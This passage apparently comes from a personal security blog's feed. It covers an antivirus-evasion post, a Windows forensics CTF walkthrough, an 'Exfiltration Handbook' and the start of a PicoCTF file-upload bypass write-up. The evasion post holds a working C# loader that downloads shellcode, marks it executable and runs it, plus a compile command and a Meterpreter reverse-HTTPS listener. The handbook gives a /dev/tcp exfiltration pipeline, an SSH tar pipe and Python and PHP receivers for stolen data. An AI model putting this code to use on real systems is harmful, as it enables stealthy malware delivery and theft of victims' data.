            Console.WriteLine($"[+] Download successful! Size: {shellcode.Length} bytes");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Network Error: {ex.Message}");
            return;
        }

        // 2. Allocate Memory (RW)
        Console.WriteLine("[*] Allocating memory...");
        IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

        // 3. Copy Shellcode
        Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);

        // 4. Change to Executable (RX)
        UInt32 oldProtect;
        VirtualProtect(codeAddr, (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

        // 5. Execute
        Console.WriteLine("[*] Executing...");
        UInt32 threadId = 0;
        IntPtr threadHandle = CreateThread(0, 0, codeAddr, IntPtr.Zero, 0, ref threadId);

        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
i686-w64-mingw32-gcc https-downloader.c -o APT-Stage.exe -lwininet
</code></pre>
  
</div>

<h4 id="step-3-set-up-the-listener-the-c2-server">Step 3: Set up the Listener (The “C2 Server”)</h4>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
sudo python3 -m http.server 80
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST eth0; set LPORT 8443; run"
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKwtpe4lUYhCAHGq9mzRZA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/v8enMs1Oexo" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="pentesting" /><summary type="html"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Windows Forensics</title><link href="/blog/Windows-Forensics" rel="alternate" type="text/html" title="Windows Forensics" /><published>2026-01-26T00:00:00-05:00</published><updated>2026-01-26T00:00:00-05:00</updated><id>http://localhost:4000/blog/Windows-Forensics</id><content type="html" xml:base="/blog/Windows-Forensics"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>

<blockquote>
  <p>1) How many user created accounts are present on the system?</p>
</blockquote>

<p>Based on the available logs, navigate to <code class="language-plaintext highlighter-rouge">C:\Windows\System32\config\SAM</code>. The SAM hive contains user account, login, and group information, primarily under <code class="language-plaintext highlighter-rouge">SAM\Domains\Account\Users</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cOWowwnx-k6MLYeF_22hsA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<blockquote>
  <p>2) What’s the password hint for the user THM-4n6?</p>
</blockquote>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NIsIYnyzuHqy6BD6LxgJRQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<blockquote>
  <p>3) When was the file ‘Changelog.txt’ accessed?</p>
</blockquote>

<p>navigate to <code class="language-plaintext highlighter-rouge">C:\Users\THM-4n6NTUSER.DAT</code> This information is stored in the NTUSER hive and can be found on the following location:</p>

<p><code class="language-plaintext highlighter-rouge">NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yE1oWyT8moAmW90IimXh0A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<blockquote>
  <p>4) When was the USB device with the friendly name ‘USB’ last connected?</p>
</blockquote>

<p>The following locations keep track of USB keys plugged into a system. These locations store the vendor id, product id, and version of the USB device plugged in and can be used to identify unique devices. These locations also store the time the devices were plugged into the system.</p>

<p><code class="language-plaintext highlighter-rouge">SYSTEM\CurrentControlSet\Enum\USBSTOR</code></p>

<p><code class="language-plaintext highlighter-rouge">SYSTEM\CurrentControlSet\Enum\USB</code></p>

<p>Registry Explorer shows this information in a nice and easy-to-understand way.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*qT03JA4XyB0so6xUwRxXwA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8vIZ7xENqLJqI9C9ZLBKvA.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8vIZ7xENqLJqI9C9ZLBKvA.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">The Exfiltration Handbook</title><link href="/blog/Data-Exfiltration" rel="alternate" type="text/html" title="The Exfiltration Handbook" /><published>2026-01-24T00:00:00-05:00</published><updated>2026-01-24T00:00:00-05:00</updated><id>http://localhost:4000/blog/Exfiltration</id><content type="html" xml:base="/blog/Data-Exfiltration"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>

<h3 id="1-the-udp-socket">1. The UDP Socket</h3>

<p>This is almost identical to the method in your text, but it uses <strong>UDP</strong> instead of TCP. This is useful if the firewall blocks TCP connections but leaves UDP open (often for DNS or media traffic).</p>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a7G9SaEkrJfqFv4Y2N_FIQ.png" data-label="Attacker (Listener)" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*J1uM1b5rD7dDmNAq_jamHg.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*k6y-TCqAW3ACofhnB74Fiw.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="http-exfiltration">HTTP Exfiltration</h3>

<p>sending data as a web request is one of the stealthiest methods. You can use curl or wget, which are installed on most Linux servers.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="python">
python3 -c '
from http.server import HTTPServer, BaseHTTPRequestHandler
class P(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode()
        with open("exfil.txt", "a") as f:
            f.write(data + "\n")
        print(f"[*] Data saved to exfil.txt")
        self.send_response(200)
        self.end_headers()
HTTPServer(("0.0.0.0", 80), P).serve_forever()
'
</code></pre>
  
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ufNbLj6UEi7dmE6F5owaQ.png" data-label="Attacker (Listener)" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4BAW1QhjX07m7w7AFxuTkw.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bIx8lsHh_Z4JXZY8qBSRiA.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="tcp-socket">TCP socket</h3>

<p>Communication over TCP requires two machines, one victim and one attacker machine, to transfer data.</p>

<p>What is happening here is a pipeline:</p>

<p><code class="language-plaintext highlighter-rouge">Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer</code></p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>

  
  <div id="interactive-tcp" class="interactive-command">
    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
      Click any part to see a short explanation
    </div>

    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
      <code>
        <span class="cmd-token" data-key="tar">tar zcf - task4/</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="base64">base64</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="dd">dd conv=ebcdic</span>
        <span class="cmd-sep"> &gt; </span>
        <span class="cmd-token" data-key="devtcp">/dev/tcp/{IP}/{PORT}</span>
      </code>
    </pre>

    <div class="cmd-explain-box" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
      Click a segment for a concise explanation.
    </div>
  </div>

  <style>
    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
    .cmd-token {
      cursor: pointer;
      color: #8be9fd;
      padding: 2px 4px;
      border-radius: 4px;
      display: inline-block;
    }
    .cmd-token:hover { background: rgba(139,233,253,0.08); }
    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
  </style>

  <script>
    (function(){
      const explanations = {
        tar: 'Create a gzip-compressed tar archive and send it to stdout.',
        base64: 'Encode the binary stream into Base64 so it can safely pass through text-only channels.',
        dd: 'Convert the character encoding to EBCDIC (often used for obfuscation).',
        devtcp: 'Send the data stream directly to a remote host via a TCP socket.'
      };

      // Use explicit ID to scope this block reliably
      const container = document.getElementById('interactive-tcp');
      if (container) {
        container.addEventListener('click', function(e){
          const token = e.target.closest('.cmd-token');
          if (!token) return;

          const box = container.querySelector('.cmd-explain-box');
          const key = token.dataset.key;

          box.textContent = explanations[key] || 'No explanation available.';
        });
      }
    })();
  </script>
  
</div>

<p>This command looks complex, but it is really just a chain of simple tools working together. At a high level, it takes a directory, packages it up, slightly disguises the data, and sends it directly to another machine over the network.</p>

<p>Nothing is written to disk. Everything happens as a live data stream.</p>

<p>Each command receives data, transforms it, and passes it along to the next step.</p>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*K1WYiX_clGaRKxAQB12sQQ.png" data-label="Attacker (Listener)" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*HeHxMpPbIJ1GWATmhfawSA.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*su5SrpJxzln85m280PlEUA.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="exfiltration-using-ssh">Exfiltration using SSH</h3>

<p>Most organizations allow outbound SSH (Port 22) for administrative purposes. Using a standard, trusted port makes your traffic look like routine maintenance rather than a data breach.</p>

<p>Because the tunnel is encrypted, Deep Packet Inspection (DPI) cannot easily see that you are sending <code class="language-plaintext highlighter-rouge">passwords.db</code> or <code class="language-plaintext highlighter-rouge">company_finances.zip.</code></p>

<p>You don’t always need to install new software; the tools already on the system are often enough for example:</p>

<table>
  <thead>
    <tr>
      <th>Tool</th>
      <th>Primary Use Case</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SCP (Secure Copy)</td>
      <td>The most straightforward way to copy files over SSH. Best for one-off transfers.</td>
    </tr>
    <tr>
      <td>SFTP</td>
      <td>Useful for interactive sessions where you need to browse the remote file system before pulling data.</td>
    </tr>
    <tr>
      <td>Rsync</td>
      <td>Highly efficient for large datasets; it supports compression and only sends the differences between files.</td>
    </tr>
  </tbody>
</table>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>

  <div id="interactive-ssh" class="interactive-command">
    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
      Click any part to see a short explanation
    </div>

    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
      <code>
        <span class="cmd-token" data-key="tar1">tar cf - task5/</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="ssh">ssh ... "..."</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="tar2">tar xpf -</span>
      </code>
    </pre>

    <div class="cmd-explain-box" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
      Click a segment for a concise explanation.
    </div>
  </div>

  <style>
    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
    .cmd-token { cursor: pointer; color: #8be9fd; padding: 2px 4px; border-radius: 4px; display: inline-block; }
    .cmd-token:hover { background: rgba(139,233,253,0.08); }
    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
  </style>

  <script>
    (function(){
      const explanations = {
        tar1: 'The "-" tells tar to send the archive to STDOUT instead of a file.',
        ssh: 'This carries that STDOUT stream securely across the network to the remote host.',
        tar2: 'On the receiving end, "-" tells tar to read from STDIN and extract immediately.'
      };

      // Use explicit ID to scope this block reliably
      const container = document.getElementById('interactive-ssh');
      if (container) {
        const tokens = container.querySelectorAll('.cmd-token');
        tokens.forEach(token => {
          token.addEventListener('click', function(e){
            e.stopPropagation();
            const box = container.querySelector('.cmd-explain-box');
            const key = token.dataset.key;
            box.textContent = explanations[key] || 'No explanation available.';
          });
        });
      }
    })();
  </script>
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*pcT4c33k3tlrP36L6agadg.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Inyk7UvYkJt30c_RytchdQ.png" data-label="attacker" data-color="#50fa7b" data-align="right" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="http-exfiltration-2">HTTP Exfiltration #2</h3>

<p>In many environments, outbound web traffic (HTTP/S) is the most likely protocol to be allowed through a firewall. By using a simple PHP “listener” on your server, you can turn a standard web request into a data mule.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*y---MTXbxTAubMVhsA-YjQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>we prepared a webserver with a data handler</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>

  
  <pre><code class="language-php">
&lt;?php
if (isset($_POST['file'])) {
    $file = fopen("/tmp/http.bs64","w");
    fwrite($file, $_POST['file']);
    fclose($file);
}
?&gt;
  </code></pre>
  
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:20000/format:webp/1*OntxvXeZbyxjXuqgGtBQfw.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a8-UMeRzW62Ev8X_V7agkA.png" data-label="attacker" data-color="#50fa7b" data-align="right" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">NOTE</code>: If you don’t want data to be transmitted in cleartext, you can set up HTTPS using SSL keys stored on a server.</p>
</blockquote>

<h3 id="icmp-data-exfiltration">ICMP Data Exfiltration</h3>

<p>the ICMP packet’s structure contains a Data section that can include strings or copies of other information, such as the IPv4 header, used for error messages.</p>

<p>As an attacker, we can use the ICMP structure to include our data within the Data section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eOmcrBE1r92MdyDZ4K8Eug.jpeg" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Xi5bPFcZVwTAl_HT9s5-xw.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*N_cqwYMmQQL2ZMkQ2JLArg.png" data-label="Victim" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Ncr6LiVxKJfCYa21_ddeYQ.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*e4r1sUcg2jYD2Zm0aqqhaQ.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #50fa7b; text-align: left; transition: all 0.3s;">
    Attacker <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="dns-exfiltration">DNS Exfiltration</h3>

<p>To perform exfiltration via the DNS protocol, you need to control a domain name and set up DNS records, including NS, A, or TXT.</p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="pentesting" /><summary type="html"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">byp4ss3d PicoCTF</title><link href="/blog/byp4ss3d_PicoCTF" rel="alternate" type="text/html" title="byp4ss3d PicoCTF" /><published>2025-11-19T00:00:00-05:00</published><updated>2025-11-19T00:00:00-05:00</updated><id>http://localhost:4000/blog/Apache-backdoor-upload</id><content type="html" xml:base="/blog/byp4ss3d_PicoCTF"><![CDATA[<p>A university’s online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded, but are they enough? Take a look at how the upload is implemented. Maybe there’s a way to slip past the checks and interact with the server in ways you shouldn’t.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Iqyhe_q1VlnX15qTt9sjwg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>When we upload an image, it appears like this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*N7fwYGGoIcegv7Cw4oYhdg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>This is how the request looks using Burp Suite:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*joVxS7lgXKoxqej64mHY0A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>I tried different extension bypasses, but they didn’t work because they only showed results like this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cbME_B0xUP4sP3nInhABzw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wNDMIIhNsExib8n0lvfGoQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>From here I tried different bypasses but none of them worked, so I decided to use the hint.</p>

<p>hint 1:</p>

<blockquote>
  <p>Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.</p>
</blockquote>

<p>hint 2:</p>

<blockquote>
  <p>Try uploading more than just one file.</p>
</blockquote>

<p>For further reading, see these resources:</p>

<ul>
  <li>Bypassing file upload filters using .htaccess (Infosec Writeups): <a href="https://infosecwriteups.com/bypassing-file-upload-filter-using-htaccess-file-ctf-ca06d7e9ebd7">https://infosecwriteups.com/bypassing-file-upload-filter-using-htaccess-file-ctf-ca06d7e9ebd7</a></li>
  <li>Apache .htaccess HOWTO (official docs): <a href="https://httpd.apache.org/docs/2.4/howto/htaccess.html">https://httpd.apache.org/docs/2.4/howto/htaccess.html</a></li>
</ul>

<h2 id="my-explanation">My explanation:</h2>

<ol>
  <li>What is the <code class="language-plaintext highlighter-rouge">.htaccess</code> file?</li>
</ol>

<p>The <code class="language-plaintext highlighter-rouge">.htaccess</code> (or Hypertext Access) file is a configuration file used by the <strong>Apache HTTP Server</strong> to manage settings for a specific directory and its subdirectories.</p>

<ul>
  <li>
    <p><strong>Decentralized Configuration:</strong> Instead of requiring administrative access to the main server configuration (<code class="language-plaintext highlighter-rouge">httpd.conf</code>), Apache allows developers and users to place these files in their web directories to override or add specific directives.</p>
  </li>
  <li>
